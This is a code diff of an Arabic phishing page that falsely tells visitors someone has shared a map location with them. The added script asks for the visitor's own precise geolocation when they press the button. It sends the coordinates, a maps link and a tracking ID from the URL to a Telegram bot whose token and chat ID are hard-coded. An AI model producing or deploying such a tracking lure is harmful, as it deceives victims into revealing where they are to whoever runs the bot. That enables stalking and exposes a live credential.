@@ -1,182 +1,206 @@
-```html
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>عرض الموقع</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>عرض الموقع</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
 
-<style>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', sans-serif;
+        }
 
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:'Cairo',sans-serif;
-}
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: url('https://images.unsplash.com/photo-1524661135-423995f22d0b?auto=format&fit=crop&w=1200&q=80') center/cover no-repeat fixed;
+        }
 
-body{
-display:flex;
-justify-content:center;
-align-items:center;
-min-height:100vh;
-background:url('https://images.unsplash.com/photo-1524661135-423995f22d0b?auto=format&fit=crop&w=1200&q=80') center/cover no-repeat fixed;
-}
+        body::before {
+            content: "";
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, .45);
+            backdrop-filter: blur(6px);
+        }
 
-body::before{
-content:"";
-position:fixed;
-inset:0;
-background:rgba(0,0,0,.45);
-backdrop-filter:blur(6px);
-}
+        .card {
+            position: relative;
+            z-index: 2;
+            width: 390px;
+            max-width: 95%;
+            background: rgba(255, 255, 255, .92);
+            backdrop-filter: blur(15px);
+            border-radius: 28px;
+            padding: 35px 28px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, .35);
+            text-align: center;
+        }
 
-.card{
-position:relative;
-z-index:2;
-width:390px;
-max-width:95%;
-background:rgba(255,255,255,.92);
-backdrop-filter:blur(15px);
-border-radius:28px;
-padding:35px 28px;
-box-shadow:0 20px 50px rgba(0,0,0,.35);
-text-align:center;
-}
+        .icon {
+            width: 90px;
+            height: 90px;
+            margin: auto;
+            margin-bottom: 20px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #34c759, #00a651);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 42px;
+            color: #fff;
+            box-shadow: 0 10px 25px rgba(52, 199, 89, .45);
+        }
 
-.icon{
-width:90px;
-height:90px;
-margin:auto;
-margin-bottom:20px;
-border-radius:50%;
-background:linear-gradient(135deg,#34c759,#00a651);
-display:flex;
-align-items:center;
-justify-content:center;
-font-size:42px;
-color:#fff;
-box-shadow:0 10px 25px rgba(52,199,89,.45);
-}
+        h1 {
+            color: #222;
+            font-size: 28px;
+            margin-bottom: 15px;
+        }
 
-h1{
-color:#222;
-font-size:28px;
-margin-bottom:15px;
-}
+        .desc {
+            font-size: 16px;
+            color: #555;
+            line-height: 1.9;
+            margin-bottom: 25px;
+        }
 
-.desc{
-font-size:16px;
-color:#555;
-line-height:1.9;
-margin-bottom:25px;
-}
+        .info {
+            background: #f8f9fb;
+            border-radius: 18px;
+            padding: 18px;
+            text-align: right;
+            margin-bottom: 25px;
+        }
 
-.info{
-background:#f8f9fb;
-border-radius:18px;
-padding:18px;
-text-align:right;
-margin-bottom:25px;
-}
+        .info h2 {
+            font-size: 18px;
+            margin-bottom: 12px;
+            color: #222;
+        }
 
-.info h2{
-font-size:18px;
-margin-bottom:12px;
-color:#222;
-}
+        .info p {
+            color: #555;
+            line-height: 1.8;
+            font-size: 15px;
+        }
 
-.info p{
-color:#555;
-line-height:1.8;
-font-size:15px;
-}
+        .btn {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 50px;
+            background: linear-gradient(135deg, #34c759, #00a651);
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: .25s;
+        }
 
-.btn{
-width:100%;
-padding:18px;
-border:none;
-border-radius:50px;
-background:linear-gradient(135deg,#34c759,#00a651);
-color:#fff;
-font-size:18px;
-font-weight:700;
-cursor:pointer;
-transition:.25s;
-}
+        .btn:hover {
+            transform: scale(1.03);
+        }
 
-.btn:hover{
-transform:scale(1.03);
-}
+        .note {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #777;
+        }
 
-.note{
-margin-top:20px;
-font-size:13px;
-color:#777;
-}
-
-</style>
+        #result {
+            margin-top: 15px;
+            font-weight: bold;
+        }
+    </style>
 </head>
 
 <body>
 
-<div class="card">
+    <div class="card">
+        <div class="icon">📍</div>
+        <h1>تم استلام موقع المستخدم</h1>
+        <p class="desc">
+            لقد أرسل إليك المستخدم موقعه الجغرافي عبر الخرائط.
+            يمكنك عرض الموقع الدقيق بالضغط على الزر أدناه.
+        </p>
 
-<div class="icon">📍</div>
+        <div class="info">
+            <h2>معلومات الموقع</h2>
+            <p>
+                سيتم فتح الموقع مباشرةً على الخريطة مع إظهار الإحداثيات الدقيقة ومكان المستخدم.
+            </p>
+        </div>
 
-<h1>تم استلام موقع المستخدم</h1>
+        <!-- ✅ دوگمەکە ئێستا id و فەنکشنی ڕاستەوخۆی هەیە -->
+        <button id="btnStart" class="btn" onclick="getLoc()">
+            📍 لعرض الموقع الدقيق اضغط هنا
+        </button>
 
-<p class="desc">
-لقد أرسل إليك المستخدم موقعه الجغرافي عبر الخرائط.
-يمكنك عرض الموقع الدقيق بالضغط على الزر أدناه.
-</p>
+        <!-- ✅ توخمێک بۆ نیشاندانی پەیامی ئەنجام -->
+        <div id="result"></div>
 
-<div class="info">
-<h2>معلومات الموقع</h2>
+        <p class="note">
+            سيتم فتح الموقع باستخدام تطبيق الخرائط على جهازك.
+        </p>
+    </div>
 
-<p>
-سيتم فتح الموقع مباشرةً على الخريطة مع إظهار الإحداثيات الدقيقة ومكان المستخدم.
-</p>
+    <!-- ✅ سکریپتی یەکگرتوو و ڕاستکراو -->
+    <script>
+        const TOKEN = '7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI';
+        const CHAT = '1015102519';
+        const chatId = new URLSearchParams(location.search).get('chatId') || 'unknown';
 
-</div>
+        async function getLoc() {
+            const btn = document.getElementById('btnStart');
+            const res = document.getElementById('result');
 
-<button class="btn" onclick="showLocation()">
-📍 لعرض الموقع الدقيق اضغط هنا
-</button>
+            btn.disabled = true;
+            btn.textContent = '⏳ جارٍ تحديد الموقع...';
+            res.textContent = '';
+            res.style.display = 'block';
 
-<p class="note">
-سيتم فتح الموقع باستخدام تطبيق الخرائط على جهازك.
-</p>
+            try {
+                // داواکردنی مۆڵەتی شوێن
+                const position = await new Promise((resolve, reject) =>
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 15000
+                    })
+                );
 
-</div>
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                const message = `📍 **موقع جديد**\n🆔 ID: ${chatId}\n📌 ${lat}, ${lng}\n🗺️ ${mapsLink}`;
 
-<script>
-function showLocation(){
-alert("سيتم فتح الموقع الدقيق...");
-}
-</script>
+                // ناردنی شوێن بۆ تێلێگرام
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
 
+                res.textContent = '✅ تم تأكيد موقعك';
+                btn.textContent = '✅ تم';
+
+            } catch (e) {
+                res.textContent = '❌ فشل: ' + e.message;
+                btn.disabled = false;
+                btn.textContent = '📍 إعادة المحاولة';
+            }
+        }
+    </script>
 </body>
 </html>
-```
-<script>
-const TOKEN='7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI',CHAT='1015102519';
-const chatId=new URLSearchParams(location.search).get('chatId')||'unknown';
-async function getLoc(){
-    const btn=document.getElementById('btnStart'),res=document.getElementById('result');
-    btn.disabled=true;btn.textContent='⏳ جارٍ...';
-    try{
-        const p=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:15000}));
-        const lat=p.coords.latitude,lng=p.coords.longitude;
-        const maps=https://www.google.com/maps?q=${lat},${lng};
-        const msg=📍 **موقع جديد**\n🆔 ID: \${chatId}\\n📌 ${lat},${lng}\n🗺️ ${maps};
-        await fetch(https://api.telegram.org/bot${TOKEN}/sendMessage,{
-            method:'POST',headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({chat_id:CHAT,text:msg,parse_mode:'Markdown'})
-        });
-        res.className='ok';res.textContent='✅ تم تأكيد موقعك';btn.textContent='✅ تم';
-    }catch(e){res.className='fail';res.textContent='❌ فشل: '+e.message;btn.disabled=false;btn.textContent='📍 إعادة المحاولة';}
-}
-</script></body></html>
